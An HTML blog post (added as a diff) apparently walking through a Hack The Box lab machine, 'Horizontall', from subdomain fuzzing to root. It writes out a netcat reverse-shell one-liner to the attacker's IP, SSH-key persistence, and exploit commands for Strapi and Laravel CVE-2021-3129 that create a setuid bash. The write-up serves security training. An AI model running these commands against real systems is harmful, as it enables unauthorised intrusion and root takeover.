@@ -1,0 +1,312 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Horizontall - HTB // FoushGX</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Muhammed Foaad" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://foushgx.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Horizontall - HTB"/>
+<meta name="twitter:description" content="Hello everyone,Here I will explain how i managed to pwn Horizontall machine from HTB.   Recon  I started with nmap scanning for port scanning. what i found is just 2 ports:  22/tcp ssh, 80/tcp nginx 1.14.0 Let&rsquo;s check port 80  Don&#39;t forget to add Machine-IP to `/etc/hosts` as root run this -&gt; echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; /etc/hosts  I enumerated site but found nothing.  Here i Decided to do directory brute-focrcing      Found nothing too."/>
+
+    <meta property="og:title" content="Horizontall - HTB" />
+<meta property="og:description" content="Hello everyone,Here I will explain how i managed to pwn Horizontall machine from HTB.   Recon  I started with nmap scanning for port scanning. what i found is just 2 ports:  22/tcp ssh, 80/tcp nginx 1.14.0 Let&rsquo;s check port 80  Don&#39;t forget to add Machine-IP to `/etc/hosts` as root run this -&gt; echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; /etc/hosts  I enumerated site but found nothing.  Here i Decided to do directory brute-focrcing      Found nothing too." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://foushgx.github.io/htb/horizontall/" />
+<meta property="article:published_time" content="2022-02-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-02-05T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://foushgx.github.io/"><img class="app-header-avatar" src="/Profile.jpg" alt="Muhammed Foaad" /></a>
+      <h1>FoushGX</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/about/">about</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/htb/">Hack The Box</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Jr.Penetration Tester | CTF Player</p>
+      <div class="app-header-social">
+        
+          <a href="https://facebook.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>Facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>LinkedIn</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Horizontall - HTB</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Feb 5, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://foushgx.github.io/tags/htb-easy/">HTB-Easy</a>
+              <a class="tag" href="https://foushgx.github.io/tags/walkthrough/">Walkthrough</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="hello-everyonehere-i-will-explain-how-i-managed-to-pwn-horizontall-machine-from-htb">Hello everyone,Here I will explain how i managed to pwn <code>Horizontall</code> machine from HTB.</h3>
+<figure>
+    <img src="/Images/horizontall/pwned.png"/> 
+</figure>
+
+<h2 id="recon">Recon</h2>
+<ol>
+<li>I started with <code>nmap</code> scanning for port scanning.
+what i found is just 2 ports:</li>
+</ol>
+<pre><code>22/tcp ssh, 80/tcp nginx 1.14.0
+</code></pre><ol start="2">
+<li>Let&rsquo;s check port <code>80</code></li>
+</ol>
+<pre><code>Don't forget to add Machine-IP to `/etc/hosts`   as root run this -&gt;  echo &quot;10.10.11.105   horizontall.htb&quot; &gt;&gt; /etc/hosts
+</code></pre><ul>
+<li>I enumerated site but found nothing.</li>
+</ul>
+<ol start="3">
+<li>Here i Decided to do directory brute-focrcing
+<figure>
+    <img src="/Images/horizontall/first-dirs.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>Found nothing too. :( Sad</li>
+</ul>
+<ol start="4">
+<li>So i jumped directly to Check for sub-domains &amp; VHOSTS</li>
+</ol>
+<pre><code>ffuf -u http://horizontall.htb/ -H &quot;Host: FUZZ.horizontall.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -mc 200 -v
+</code></pre><ul>
+<li>And yeeeey!!! found VHOSTS.<figure>
+    <img src="/Images/horizontall/VHOSTS.png"/> 
+</figure>
+</li>
+</ul>
+<blockquote>
+<p>Let&rsquo;s add those sub-domains to <code>/etc/hosts</code> as root</p>
+</blockquote>
+<ol start="5">
+<li>Now, we know that <code>www</code> will open the main page of Site, so  I checked <code>api-prod</code> and main page is -&gt;
+<figure>
+    <img src="/Images/horizontall/API-home.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>By directory brute-forcing on this VHOST i found some Valuable Dirs:<figure>
+    <img src="/Images/horizontall/api-dirs.png"/> 
+</figure>
+</li>
+</ul>
+<ol start="6">
+<li>By checking <code>/reviews</code>, <code>/users</code> we got 3 names <code>john</code>, <code>doe</code>, <code>wail</code> Note them.</li>
+<li>Then checked <code>/admin</code> and got a Login form for <code>Strapi-CMS</code>
+<figure>
+    <img src="/Images/horizontall/api-admin.png"/> 
+</figure>
+</li>
+<li>Tried to using default Cred like <code>admin:admin</code> and some <code>SQLi</code>, but nothing worked.</li>
+<li>Then i tried to know the version of <code>CMS</code> from the site itself, maybe it&rsquo;s vulnerable.</li>
+</ol>
+<ul>
+<li>by <code>view page source</code> i found 2 <code>js</code> files start to enumerating them.</li>
+<li>Searching in <a href="https://docs.strapi.io/user-docs/latest/content-types-builder/introduction-to-content-types-builder.html">Strapi docs</a> i found that we can know version from this line
+<code>strapi-plugin-content-type</code>plugin cause it is always activated, by searching for it i found this. <figure>
+    <img src="/Images/horizontall/strapi-CMS-version.png"/> 
+</figure>
+</li>
+</ul>
+<hr>
+<h2 id="foothold">Foothold</h2>
+<ol>
+<li>using <code>searchsploit strapi</code> i got <a href="https://www.exploit-db.com/exploits/50239">Strapi 3.0.0-beta.17.7 RCE</a></li>
+</ol>
+<ul>
+<li>I had a problem with this script so i used this one <a href="https://github.com/nth347/CVE-2021-3129_exploit">CVE-2021-3129</a></li>
+</ul>
+<ol start="2">
+<li>We will use it by running exploit script. then write reverse shell cmd inside script  <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.8 4444 &gt;/tmp/f</code>.
+<figure>
+    <img src="/Images/horizontall/exploit.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>After script running will give to us the valid Cred for <code>admin</code> as we see in <code>1</code>.</li>
+</ul>
+<blockquote>
+<p>Don&rsquo;t forget to run listener first <code>nc -nlvp 4444</code>.</p>
+</blockquote>
+<ul>
+<li>then we can write our reverse shell command as you see in <code>2</code>.</li>
+</ul>
+<ol start="3">
+<li>Now we got a shell as <code>strapi</code> user. we can read some files from <code>developer</code> user.
+<figure>
+    <img src="/Images/horizontall/strapi-shell.png"/> 
+</figure>
+</li>
+<li>Starting to enumerating for any passwd or ssh keys by searching for  <code>password</code>, <code>id_rsa</code>, <code>authorized_keys</code>. and i got one under <code>/opt/strapi/.ssh/authorized_keys</code></li>
+<li>I have a write permission on this folder <code>.ssh/</code>cause i&rsquo;m owner of this,</li>
+</ol>
+<ul>
+<li>So, I created a <code>ssh key</code> to access via ssh.</li>
+</ul>
+<pre><code>ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+</code></pre><ul>
+<li>And copied <code>id_rsa</code> private key to my machine to connect with it.</li>
+</ul>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ol>
+<li>Now, i&rsquo;m connected via <code>ssh</code></li>
+<li>After some enumeration in the target machine.</li>
+</ol>
+<ul>
+<li>using <code>find / -perm /4000 2&gt;/dev/null</code> got nothing.</li>
+<li>Searching for any files or services running can exploit.</li>
+</ul>
+<ol start="3">
+<li>By enumerating open ports <code>netstat -ano</code>, i got some new ports that not appear to me in port scanning.<figure>
+    <img src="/Images/horizontall/netstat-enum.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>I found 3 ports running locally, as we know <code>3306</code> is for mysql Database, <code>1337</code> for strapi api <code>if you read exploit script will know</code>.</li>
+</ul>
+<ol start="4">
+<li>So, I checked <code>8000/tcp</code> by using <code>curl 127.0.0.1:8000</code></li>
+</ol>
+<ul>
+<li>i found another site running locally with title <code>laravel</code> <figure>
+    <img src="/Images/horizontall/local-site.png"/> 
+</figure>
+</li>
+</ul>
+<ol start="5">
+<li>So to View it in browser and Enumerate it we need to make a <code>port forwarding</code>.</li>
+</ol>
+<ul>
+<li>Running <code>ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 -i id_rsa</code> will start <code>port forwarding</code>.</li>
+<li>It&rsquo;s a simple site with <code>laravel</code>, by enumerating this website will find in footer of page version of framework <code>Laravel v8 (PHP v7.4.18).</code>
+<figure>
+    <img src="/Images/horizontall/laravel.png"/> 
+</figure>
+</li>
+</ul>
+<ol start="6">
+<li>so i searched for exploit for it, maybe it&rsquo;s vulnerable, and i found 2 exploit <figure>
+    <img src="/Images/horizontall/exploit2.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>one was <code>XSS</code> and i didn&rsquo;t need it, and second was <code>RCE</code> via <code>Debug mode</code>.</li>
+<li>I tried to run this script but have some problems in the code itself.</li>
+</ul>
+<ol start="7">
+<li>So after some searching I found another one which worked for me, you can get it from here -&gt; <a href="https://github.com/nth347/CVE-2021-3129_exploit">CVE-2021-3129</a></li>
+</ol>
+<ul>
+<li>So i run this exploit script from my machine on the forwarded port.
+<figure>
+    <img src="/Images/horizontall/root-access.png"/> 
+</figure>
+</li>
+</ul>
+<ol start="8">
+<li>Last step that i got a full shell as root.</li>
+</ol>
+<ul>
+<li>Running the exploit script to copping bash shell as root then running it.</li>
+<li>Running from my Machine too.</li>
+</ul>
+<pre><code>$ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 &quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot;
+</code></pre><ul>
+<li>back to the <code>ssh</code> strapi shell and run <code>/tmp/bash -p </code>
+<figure>
+    <img src="/Images/horizontall/rooted.png"/> 
+</figure>
+</li>
+</ul>
+<p>Congrats!!!! you now A full Root &hellip;.. xD</p>
+<p>Hint:
+For fast rooting we can use <code>pkexec CVE-2021-4034</code> but it&rsquo;s not the good way to pwn machine xD.
+PoC ==&gt;<br>
+<figure>
+    <img src="/Images/horizontall/pkexec.png"/> 
+</figure>
+</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
